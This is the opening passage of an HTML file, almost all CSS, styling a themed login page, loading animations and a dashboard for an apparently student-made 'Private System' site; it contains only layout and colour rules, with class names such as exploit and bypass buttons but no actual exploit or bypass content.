<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* Global CSS Variables */
    :root {
      --primary-color-dark: #ff914d; /* Orange Accent */
      --secondary-color-dark: #2a2a2a; /* Dark Grey Box Background */
      --background-color-dark: #1a1a1a; /* Darkest Background */
      --text-color-dark: #f9f2dc; /* Light Cream Text */
      --box-shadow-dark: rgba(255, 145, 77, 0.3);
      --input-focus-border: #ffbb77; /* Lighter orange for input focus */

      --primary-color-light: #ffd966; /* Yellow Accent */
      --secondary-color-light: #ffd999; /* Lighter Yellow Box Background */
      --background-color-light: #f9f2dc; /* Light Background */
      --text-color-light: #1a1a1a; /* Dark Text */
      --box-shadow-light: rgba(255, 145, 77, 0.6);
      --input-focus-border-light: #fecb2f; /* Lighter yellow for input focus */

      /* Login Specific Colors (consistent across themes for login, unless overridden) */
      --login-box-bg: #000;
      --login-box-border: white;
      --login-box-shadow: 0 0 15px white;
      --input-bg: #1c1c1c;
      --input-color: white;
      --button-bg: #dc3545; /* Red for login button */
      --button-hover-bg: #c82333; /* Darker red */
      --button-color: white;
      --error-color: #dc3545; /* Bootstrap red */

      /* Dashboard Specific Colors (default dark theme) */
      --dashboard-header-bg: var(--primary-color-dark);
      --dashboard-header-text: #000;
      --quickbar-button-bg: var(--primary-color-dark);
      --quickbar-button-hover-bg: #ffb67a;
      --dashboard-box-bg: var(--secondary-color-dark);
      --dashboard-box-shadow: var(--box-shadow-dark);
      --dashboard-box-h2: #ffbf80;
      --update-entry-bg: #40210f;
      --update-entry-text: #ffccb3;
      --calendar-cell-bg: #333;
      --calendar-today-bg: var(--primary-color-dark);
      --motivation-box-bg: #333;
      --motivation-box-text: #ffd966;
      --canvas-border: var(--primary-color-dark);
      --info-panel-bg: var(--secondary-color-dark);
      --info-panel-h2: var(--primary-color-dark);
      --list-link-button-bg: var(--primary-color-dark);
      --coming-soon-bg: #40210f;
      --info-text-bg: #40210f;
      --school-info-item-bg: #40210f;
      --school-info-label-color: var(--primary-color-dark);
      --activity-log-entry-bg: #333;
      --activity-log-entry-text: #ffccb3;
      --settings-item-bg: #333;
      --panel-handle-bg: rgba(255, 255, 255, 0.08);

      /* WiFi level colors */
      --wifi-high-color: #28a745; /* Green */
      --wifi-medium-color: #ffc107; /* Yellow */
      --wifi-low-color: #dc3545; /* Red */

      /* Notification styles */
      --notification-bg-success: #4CAF50; /* Green */
      --notification-text: white;
    }

    /* Light Theme Overrides */
    body.light-theme {
      background: var(--background-color-light);
      color: var(--text-color-light);

      --dashboard-header-bg: var(--primary-color-light);
      --dashboard-header-text: var(--text-color-light);
      --quickbar-button-bg: var(--primary-color-light);
      --quickbar-button-hover-bg: #fcdf87;
      --dashboard-box-bg: var(--primary-color-light);
      --dashboard-box-shadow: var(--box-shadow-light);
      --dashboard-box-h2: #994d00;
      --update-entry-bg: #ffd999;
      --update-entry-text: #994d00;
      --calendar-cell-bg: var(--primary-color-light);
      --calendar-today-bg: #994d00;
      --motivation-box-bg: #fff3cc;
      --motivation-box-text: #994d00;
      --canvas-border: #994d00;
      --info-panel-bg: var(--primary-color-light);
      --info-panel-h2: #994d00;
      --list-link-button-bg: var(--primary-color-light);
      --coming-soon-bg: #ffd999;
      --info-text-bg: #ffd999;
      --school-info-item-bg: #ffd999;
      --school-info-label-color: #994d00;
      --activity-log-entry-bg: #ffd999;
      --activity-log-entry-text: #994d00;
      --settings-item-bg: var(--primary-color-light);
      --panel-handle-bg: rgba(0, 0, 0, 0.08);
      --input-focus-border: var(--input-focus-border-light);
    }

    /* Blue Theme Overrides */
    body.blue-theme {
      background-color: #2b3a50; /* Dark Blue Background */
      color: #e0f2f7; /* Light Blue Text */

      --dashboard-header-bg: #5dade2; /* Medium Blue Accent */
      --dashboard-header-text: #0d2847;
      --quickbar-button-bg: #5dade2;
      --quickbar-button-hover-bg: #85c1e9;
      --dashboard-box-bg: #3b4e6b; /* Darker Blue Box Background */
      --dashboard-box-shadow: rgba(93, 173, 226, 0.4);
      --dashboard-box-h2: #aed6f1; /* Lighter Blue Headers */
      --update-entry-bg: #4a5c78;
      --update-entry-text: #d1e9f7;
      --calendar-cell-bg: #4a5c78;
      --calendar-today-bg: #5dade2;
      --motivation-box-bg: #3f587a;
      --motivation-box-text: #aed6f1;
      --canvas-border: #5dade2;
      --info-panel-bg: #3b4e6b;
      --info-panel-h2: #aed6f1;
      --list-link-button-bg: #5dade2;
      --coming-soon-bg: #4a5c78;
      --info-text-bg: #4a5c78;
      --school-info-item-bg: #4a5c78;
      --school-info-label-color: #aed6f1;
      --activity-log-entry-bg: #4a5c78;
      --activity-log-entry-text: #d1e9f7;
      --settings-item-bg: #4a5c78;
      --panel-handle-bg: rgba(0, 0, 0, 0.15);
      --input-focus-border: #85c1e9;
    }


    /* General Body Styling */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }
    
    body {
      margin: 0; padding: 0;
      background: var(--background-color-dark);
      color: var(--text-color-dark);
      min-height: 100vh;
      overflow-x: hidden;
    }

    /* Initial Loading Screen Styles */
    #initialLoadingScreen, #loginLoadingScreen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #000;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      opacity: 1;
      visibility: visible;
      transition: opacity 0.8s ease-out, visibility 0.8s ease-out;
    }

    #initialLoadingScreen.hidden, #loginLoadingScreen.hidden {
      opacity: 0;
      visibility: hidden;
    }

    .rotating-box-container {
      perspective: 1000px;
      margin-bottom: 20px;
    }

    .rotating-box {
      width: 100px;
      height: 100px;
      position: relative;
      transform-style: preserve-3d;
      animation: rotateCube 10s infinite linear;
      transform-origin: 50% 50%;
      transition: all 0.8s ease-out; /* Smooth transitions for face changes */
    }

    .rotating-box .face {
      position: absolute;
      width: 100%;
      height: 100%;
      border: 3px solid white;
      background: rgba(255, 145, 77, 0.4);
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 0.8em;
      font-weight: bold;
      color: white;
      text-shadow: 0 0 5px black;
      box-shadow: 0 0 10px white;
      transition: background 0.5s ease-in-out, border-color 0.5s ease-in-out, box-shadow 0.5s ease-in-out, opacity 0.5s ease-out;
    }
    .rotating-box .face-hidden {
        opacity: 0 !important;
        pointer-events: none; /* Make it unclickable */
    }


    /* Specific face transforms for 3D effect */
    .rotating-box .front { transform: translateZ(50px); }
    .rotating-box .back { transform: rotateY(180deg) translateZ(50px); }
    .rotating-box .right { transform: rotateY(90deg) translateZ(50px); }
    .rotating-box .left { transform: rotateY(-90deg) translateZ(50px); }
    .rotating-box .top { transform: rotateX(90deg) translateZ(50px); }
    .rotating-box .bottom { transform: rotateX(-90deg) translateZ(50px); }

    @keyframes rotateCube {
      0% { transform: rotateX(0deg) rotateY(0deg) rotateZ(0deg); }
      100% { transform: rotateX(360deg) rotateY(360deg) rotateZ(360deg); }
    }

    #loadingText, #loginLoadingScreenText {
      font-family: 'Courier New', monospace;
      font-size: 1.5em;
      font-weight: bold;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      color: transparent;
      transition: background-image 1s ease-in-out, opacity 0.5s ease-in-out;
      opacity: 1;
      min-height: 1.5em; /* Prevent layout shift if text is empty */
    }

    @keyframes typing {
        from { width: 0; }
        to { width: 100%; }
    }
    @keyframes blinkCaret {
        from, to { border-color: transparent }
        50% { border-color: white; }
    }
    .typing-text-container {
        display: inline-block;
        overflow: hidden; /* Ensures text is hidden until typed */
        border-right: .15em solid white; /* The caret */
        white-space: nowrap; /* Keeps all text on one line */
        margin: 0 auto;
        animation: 
            typing 1.5s steps(40, end) forwards,
            blinkCaret .75s step-end infinite;
        width: 0; /* Start hidden */
    }

    #codeAnimation {
      display: none;
      width: 80%;
      max-width: 400px;
      height: 20px;
      background-color: #333;
      border-radius: 10px;
      overflow: hidden;
      margin-top: 10px;
      position: relative;
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.2); /* Soft glow */
    }

    /* Enhanced code animation: glowing stripes moving */
    #codeAnimation::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: repeating-linear-gradient(
        45deg,
        #4CAF50,
        #4CAF50 5px,
        #2196F3 5px,
        #2196F3 10px
      );
      background-size: 200% 200%;
      animation: codeBackgroundPan 3s linear infinite, codeFill 3s ease-out forwards;
      clip-path: inset(0 100% 0 0); /* Start completely hidden */
      filter: drop-shadow(0 0 5px #4CAF50); /* Subtle glow for animation */
    }

    @keyframes codeFill {
      0% { clip-path: inset(0 100% 0 0); }
      100% { clip-path: inset(0 0% 0 0); }
    }
    @keyframes codeBackgroundPan {
        0% { background-position: 0% 0%; }
        100% { background-position: 200% 0%; }
    }


    /* Login Quick Bar Styles */
    .login-quick-bar {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      display: flex;
      justify-content: flex-end;
      align-items: center;
      padding: 10px 20px;
      background-color: rgba(0, 0, 0, 0.7);
      gap: 10px;
      z-index: 1000;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
    }
    
    .login-quick-bar button {
      background-color: #ff4c4c;
      border: none;
      padding: 8px 12px;
      border-radius: 5px;
      color: white;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s ease-in-out, transform 0.1s;
    }
    
    .login-quick-bar button:hover {
      background-color: #e60000;
      transform: translateY(-2px);
    }
    .login-quick-bar button:active {
        transform: translateY(0);
    }

    /* Login System Styles */
    body.login-body {
      background: var(--background-color-dark);
      color: var(--text-color-dark);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }
    
    .login-box {
      background: var(--login-box-bg);
      border-radius: 20px;
      border: 3px solid var(--login-box-border);
      box-shadow: var(--login-box-shadow);
      width: 380px;
      padding: 30px 25px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s, transform 0.2s ease-in-out;
      display: none;
      margin-bottom: 20px;
    }

    .login-box:hover {
        transform: scale(1.01); /* Subtle enlarge on hover */
        box-shadow: 0 0 25px var(--login-box-border); /* Enhanced glow */
    }
    
    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: var(--error-color); box-shadow: 0 0 15px var(--error-color); }
      50% { border-color: var(--login-box-border); box-shadow: 0 0 5px var(--login-box-border); }
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      20%, 60% { transform: translateX(-5px); }
      40%, 80% { transform: translateX(5px); }
    }
    .error-message.shake {
        animation: shake 0.3s ease-in-out;
        color: var(--error-color);
        font-weight: bold;
    }
    
    .login-box h2 {
      font-size: 1.7em;
      margin-bottom: 20px;
      font-family: 'Courier New', monospace;
      color: var(--text-color-dark);
    }
    
    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: var(--input-bg);
      border: 1px solid rgba(255, 255, 255, 0.2); /* Softer initial border */
      color: var(--input-color);
      border-radius: 8px;
      font-size: 1em;
      box-sizing: border-box;
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    .login-box input:focus {
        outline: none;
        border-color: var(--input-focus-border);
        box-shadow: 0 0 8px var(--input-focus-border); /* Subtle glow on focus */
    }
    
    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 10px;
      gap: 10px;
      cursor: pointer;
      color: var(--text-color-dark);
    }

    /* Show password & 24hr format toggle switch */
    .switch {
      position: relative;
      display: inline-block;
      width: 45px;
      height: 24px;
      flex-shrink: 0;
    }

    .switch input {
      opacity: 0;
      width: 0;
      height: 0;
    }

    .slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: #ccc;
      transition: .4s;
      border-radius: 24px;
    }

    .slider:before {
      position: absolute;
      content: "";
      height: 16px;
      width: 16px;
      left: 4px;
      bottom: 4px;
      background-color: white;
      transition: .4s;
      border-radius: 50%;
    }

    input:checked + .slider {
      background-color: #4CAF50;
    }

    input:focus + .slider {
      box-shadow: 0 0 1px #4CAF50;
    }

    input:checked + .slider:before {
      transform: translateX(21px);
    }
    
    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: var(--button-bg);
      color: var(--button-color);
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 10px;
      transition: background 0.2s, transform 0.1s;
    }
    .login-box button:hover {
        background-color: var(--button-hover-bg);
        transform: translateY(-2px);
    }
    .login-box button:active {
        transform: translateY(0);
    }
    
    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: var(--error-color);
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: black;
      border: 3px solid white;
      border-radius: 15px;
      box-shadow: 0 0 20px white;
      z-index: 10;
    }
    
    .popup input {
      margin-bottom: 15px;
    }

    /* Login Page Current Time/Date Box */
    .login-datetime-box {
      background: rgba(0, 0, 0, 0.7);
      border: 1px solid rgba(255, 255, 255, 0.3);
      border-radius: 10px;
      padding: 15px 20px;
      color: white;
      font-family: 'Consolas', monospace;
      font-size: 1.1em;
      text-align: left;
      width: 380px;
      max-width: 90%;
      box-sizing: border-box;
      display: none;
      flex-direction: column;
      gap: 8px;
      transition: transform 0.2s ease-in-out;
    }
    .login-datetime-box:hover {
        transform: translateY(-5px);
    }

    .login-datetime-box div {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    /* Toggle for 24h format in login date/time box */
    .format-toggle {
      display: flex;
      align-items: center;
      gap: 10px;
      cursor: pointer;
      justify-content: flex-end;
      font-size: 0.9em;
      margin-top: 10px;
    }
    .format-toggle span:first-child {
        flex-grow: 1;
        text-align: right;
    }


    /* Dashboard Styles */
    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: var(--background-color-dark);
      color: var(--text-color-dark);
      padding: 20px;
      transition: background-color 0.3s, color 0.3s;
      zoom: 1; 
      min-height: 100vh;
    }

    /* Notification for Welcome User */
    #dashboardNotificationsContainer {
        position: fixed;
        top: 20px;
        right: 20px;
        z-index: 2000; /* Higher z-index */
        display: flex;
        flex-direction: column;
        gap: 10px;
        max-width: 350px;
    }
    .dashboard-notification {
      background-color: var(--notification-bg-success);
      color: var(--notification-text);
      padding: 10px 20px;
      border-radius: 8px;
      font-weight: bold;
      opacity: 0;
      visibility: hidden;
      transform: translateX(100%);
      transition: opacity 0.5s ease-out, visibility 0.5s ease-out, transform 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
      display: flex;
      justify-content: space-between;
      align-items: center;
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
    }

    .dashboard-notification.show {
      opacity: 1;
      visibility: visible;
      transform: translateX(0);
    }
    .dashboard-notification .close-btn {
        background: none;
        border: none;
        color: white;
        font-size: 1.2em;
        margin-left: 10px;
        cursor: pointer;
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--dashboard-header-bg);
      padding: 15px 25px;
      border-radius: 12px;
      color: var(--dashboard-header-text);
      margin-bottom: 20px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    }
    
    .dashboard-header h1 {
      font-size: 24px;
      margin: 0;
    }
    
    .user-info {
      font-weight: bold;
      font-size: 14px;
    }
    
    .version-box {
      background: var(--primary-color-light);
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }

    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 10px; 
      flex-wrap: wrap;
      position: sticky;
      top: 0;
      background-color: var(--background-color-dark); /* Explicit background to prevent bleed-through on scroll */
      padding: 10px 0;
      z-index: 99;
    }
    body.light-theme .quick-bar { background-color: var(--background-color-light); }
    body.blue-theme .quick-bar { background-color: #2b3a50; } /* Use direct color to ensure override */


    .quick-bar input[type="search"] {
      flex-grow: 1;
      max-width: 300px;
      padding: 10px 14px;
      border-radius: 8px;
      border: 1px solid rgba(255, 255, 255, 0.2);
      background-color: #333;
      color: white;
      min-width: 150px;
      transition: border-color 0.2s, background-color 0.2s, box-shadow 0.2s;
    }
    .quick-bar input[type="search"]::placeholder {
      color: #ccc;
    }
    .quick-bar input[type="search"]:focus {
      outline: none;
      border-color: var(--input-focus-border);
      background-color: #2a2a2a;
      box-shadow: 0 0 8px var(--input-focus-border);
    }
    
    .quick-bar button {
      background-color: var(--quickbar-button-bg);
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      min-width: 110px;
      white-space: nowrap;
    }
    
    .quick-bar button:hover {
      background-color: var(--quickbar-button-hover-bg);
      transform: translateY(-2px);
    }
    .quick-bar button:active {
        transform: translateY(0);
    }
    
    #panicBtn {
      background: #ff4c4c !important;
      color: white !important;
    }
    #panicBtn:hover {
      background: #e60000 !important;
    }

    /* Draggable/Resizable Panel Handle */
    .panel-handle {
        cursor: grab;
        background-color: var(--panel-handle-bg);
        padding: 5px;
        border-radius: 5px;
        margin-bottom: 10px;
        text-align: center;
        font-size: 0.75em;
        color: rgba(255, 255, 255, 0.5);
        transition: background-color 0.2s, color 0.2s, transform 0.1s ease-out;
        user-select: none;
        position: absolute; /* Position it absolutely within its parent .box */
        top: 0; left: 0; right: 0; /* Cover the top portion of the box */
        height: 30px; /* Make handle taller for easier grabbing */
        opacity: 0; /* Hidden by default for less clutter */
        pointer-events: none; /* Cannot be interacted with if invisible */
        display: block; /* Managed by JS to set opacity */
    }
    .box:hover > .panel-handle {
        opacity: 1; /* Show on box hover */
        pointer-events: auto; /* Enable interaction */
    }
    .panel-handle:hover {
        background-color: rgba(255, 255, 255, 0.2); /* Brighter on hover */
        color: rgba(255, 255, 255, 0.8);
    }
    .panel-handle:active {
        cursor: grabbing;
        transform: scale(1.02); /* Slight enlargement when active */
    }

    /* For interact.js resizing corners (dynamic handles for interact) */
    .box[data-x].resizable {
        /* Add some specific styles for resized boxes */
    }
    .resize-handle { /* Default resize handle if interact.js creates its own */
        background: var(--primary-color-dark) !important;
        border-radius: 3px;
        opacity: 0.6;
    }


    .announcement-bar {
      width: 100%;
      background-color: var(--dashboard-header-bg);
      color: var(--dashboard-header-text);
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    
    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }
    
    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }
    
    .main-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }
    
    .box {
      background-color: var(--dashboard-box-bg);
      padding: 20px;
      border-radius: 12px;
      box-shadow: var(--dashboard-box-shadow);
      min-height: 120px;
      transition: background-color 0.3s, color 0.3s, transform 0.2s ease-out, box-shadow 0.2s ease-out;
      flex: 1 1 300px;
      position: relative;
    }
    .box:hover {
        transform: translateY(-5px); /* Lift effect on hover */
        box-shadow: 0 8px 16px rgba(0,0,0,0.3), var(--dashboard-box-shadow); /* Enhanced shadow */
    }
    .box.dragging { /* Style for being dragged */
        opacity: 0.8;
        z-index: 100;
        box-shadow: 0 12px 20px rgba(0,0,0,0.5), var(--dashboard-box-shadow);
        cursor: grabbing;
    }
    .box.highlight { /* Highlight style for search result */
        outline: 3px solid var(--primary-color-dark) !important;
        box-shadow: 0 0 15px var(--primary-color-dark) !important;
    }

    
    .box h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: var(--dashboard-box-h2);
    }
    
    .box p, .box ul {
      font-size: 14px;
    }
    
    .update-entry {
      background: var(--update-entry-bg);
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: var(--update-entry-text);
      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
      transition: background-color 0.2s;
    }
    
    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }
    
    .calendar div {
      padding: 6px;
      background: var(--calendar-cell-bg);
      border-radius: 4px;
      transition: background-color 0.2s;
    }
    
    .today {
      background: var(--calendar-today-bg) !important;
      font-weight: bold;
      color: black !important;
    }
    
    .motivation-box {
      background-color: var(--motivation-box-bg);
      color: var(--motivation-box-text);
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
      line-height: 1.5;
    }
    
    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      background-color: var(--dashboard-box-bg);
      padding: 20px;
      border-radius: 12px;
      box-shadow: var(--dashboard-box-shadow);
      min-width: 600px; /* Keep minimum width for canvas */
      max-width: 90%;
      margin-left: auto; /* Center canvas container */
      margin-right: auto;
    }
    
    #notesCanvas {
      border: 2px solid var(--canvas-border);
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
      box-shadow: 0 0 10px var(--canvas-border);
      margin-bottom: 15px; /* Space between canvas and controls */
    }
    
    #canvasControls {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px;
      margin-top: 15px;
      padding: 10px;
      border-radius: 8px;
      background: rgba(0,0,0,0.2); /* Slight background for controls */
    }
    
    #canvasControls button {
      background-color: var(--primary-color-dark);
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      margin: 0;
    }
    
    #canvasControls button:hover {
      background-color: var(--quickbar-button-hover-bg);
      transform: translateY(-2px);
    }
    #canvasControls button:active {
        transform: translateY(0);
    }

    /* Canvas color picker & slider styling */
    #canvasControls input[type="color"] {
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none;
        width: 38px; /* Slightly larger */
        height: 38px;
        background-color: transparent;
        border: none;
        cursor: pointer;
        padding: 0;
        box-shadow: 0 0 0 3px var(--canvas-border); /* Thicker border */
        border-radius: 50%;
        overflow: hidden;
        align-self: center; /* Center vertically with buttons */
    }
    #canvasControls input[type="color"]::-webkit-color-swatch-wrapper {
      padding: 0;
    }
    #canvasControls input[type="color"]::-webkit-color-swatch {
        border-radius: 50%;
        border: none;
    }
    #canvasControls input[type="color"]::-moz-color-swatch {
        border-radius: 50%;
        border: none;
    }

    #canvasControls input[type="range"] {
        -webkit-appearance: none;
        width: 120px; /* Slightly longer */
        height: 10px; /* Thicker track */
        background: #555; /* Darker track */
        border-radius: 5px;
        outline: none;
        opacity: 0.8;
        transition: opacity .2s;
        align-self: center;
    }
    #canvasControls input[type="range"]:hover {
        opacity: 1;
    }
    #canvasControls input[type="range"]::-webkit-slider-thumb {
        -webkit-appearance: none;
        appearance: none;
        width: 24px; /* Larger thumb */
        height: 24px;
        border-radius: 50%;
        background: var(--primary-color-dark);
        cursor: grab;
        box-shadow: 0 0 5px rgba(0,0,0,0.5);
    }
    #canvasControls input[type="range"]::-webkit-slider-thumb:active {
        cursor: grabbing;
        background: var(--quickbar-button-hover-bg);
    }
    #canvasControls input[type="range"]::-moz-range-thumb {
        width: 24px;
        height: 24px;
        border-radius: 50%;
        background: var(--primary-color-dark);
        cursor: grab;
        box-shadow: 0 0 5px rgba(0,0,0,0.5);
    }
    #canvasControls input[type="range"]::-moz-range-thumb:active {
        cursor: grabbing;
        background: var(--quickbar-button-hover-bg);
    }

    #textNotesArea {
        display: none;
        width: calc(100% - 20px);
        min-height: 150px;
        margin-top: 15px;
        padding: 10px;
        background-color: #2a2a2a;
        border: 1px solid var(--canvas-border);
        border-radius: 8px;
        color: white;
        resize: vertical;
        font-size: 0.95em;
        line-height: 1.6;
        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }
    #textNotesArea:focus {
        outline: none;
        border-color: var(--input-focus-border);
        box-shadow: 0 0 8px var(--input-focus-border);
    }
    
    /* Info Panel Styles */
    .info-panel {
      display: none;
      background-color: var(--info-panel-bg);
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: var(--dashboard-box-shadow);
      position: relative; /* For interact.js and handle */
    }
    .info-panel:hover {
        transform: translateY(-5px); /* Lift effect on hover */
        box-shadow: 0 8px 16px rgba(0,0,0,0.3), var(--dashboard-box-shadow); /* Enhanced shadow */
    }

    .info-panel h2 {
      color: var(--info-panel-h2);
      margin-bottom: 15px;
    }
    
    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); /* More responsive columns */
      gap: 10px;
      margin-bottom: 15px;
    }
    
    .wifi-grid div {
      padding: 8px;
      background: #333;
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
      color: #fff;
      transition: background-color 0.2s;
    }
    
    .wifi-entry {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); /* Match grid columns */
      gap: 10px;
      margin-bottom: 10px;
    }
    
    .wifi-entry div {
      padding: 8px;
      background: #40210f;
      border-radius: 6px;
      text-align: center;
      transition: background-color 0.2s;
    }
    
    /* WiFi level colors */
    .wifi-level-high { background-color: var(--wifi-high-color) !important; color: black !important; }
    .wifi-level-medium { background-color: var(--wifi-medium-color) !important; color: black !important; }
    .wifi-level-low { background-color: var(--wifi-low-color) !important; color: white !important; }


    /* Generic button/link list styles used by handbook, student websites, etc. */
    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons, .ipad-options {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }
    .handbook-buttons a, .links-list a, .exploit-buttons a, .bypass-buttons button, .ipad-options button {
      background-color: var(--list-link-button-bg);
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      text-decoration: none;
      text-align: center;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 40px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    .handbook-buttons a:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover, .ipad-options button:hover {
      background-color: var(--quickbar-button-hover-bg);
      transform: translateY(-2px);
    }
    .handbook-buttons a:active, .links-list a:active, .exploit-buttons a:active, .bypass-buttons button:active, .ipad-options button:active {
        transform: translateY(0);
    }
    
    .coming-soon {
      background: var(--coming-soon-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
      opacity: 0.8;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    
    .info-text {
      background: var(--info-text-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      line-height: 1.6;
    }
    
    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }
    
    .school-info-item {
      background: var(--school-info-item-bg);
      padding: 12px;
      border-radius: 8px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
    }
    
    .school-info-label {
      font-weight: bold;
      color: var(--school-info-label-color);
      margin-bottom: 5px;
    }
    
    .ipad-content, .bypass-content {
      display: none;
      background: var(--coming-soon-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    
    /* Calculator and Unit Converter styles */
    .calculator-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 5px;
      width: 250px;
      margin: 10px auto;
      background-color: #333;
      padding: 10px;
      border-radius: 10px;
    }
    .calculator-display {
      grid-column: span 4;
      background-color: #444;
      color: white;
      padding: 10px;
      border-radius: 5px;
      text-align: right;
      font-size: 1.5em;
      margin-bottom: 5px;
      overflow-x: auto;
      white-space: nowrap; /* Prevent number wrapping */
    }
    .calculator-grid button {
      background-color: #555;
      color: white;
      border: none;
      padding: 15px;
      border-radius: 5px;
      font-size: 1.1em;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s;
    }
    .calculator-grid button:hover {
      background-color: #777;
      transform: translateY(-2px);
    }
    .calculator-grid button:active {
        transform: translateY(0);
    }
    .calculator-grid .operator {
      background-color: var(--primary-color-dark);
      color: black;
    }
    .calculator-grid .operator:hover {
      background-color: var(--quickbar-button-hover-bg);
    }
    .calculator-grid .equal {
      background-color: #28a745;
    }
    .calculator-grid .equal:hover {
      background-color: #218838;
    }
    .unit-converter-input-group {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin-bottom: 10px;
      align-items: center;
      justify-content: center;
    }
    .unit-converter-input-group input, .unit-converter-input-group select {
      padding: 8px;
      border-radius: 5px;
      border: 1px solid #555;
      background-color: #333;
      color: white;
      flex-grow: 1;
      min-width: 100px;
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    .unit-converter-input-group input:focus, .unit-converter-input-group select:focus {
        outline: none;
        border-color: var(--input-focus-border);
        box-shadow: 0 0 5px var(--input-focus-border);
    }
    .unit-converter-input-group input::placeholder {
      color: #ccc;
    }
    .unit-converter-result {
      margin-top: 15px;
      font-size: 1.2em;
      font-weight: bold;
      background-color: var(--update-entry-bg);
      padding: 10px;
      border-radius: 8px;
      color: var(--update-entry-text);
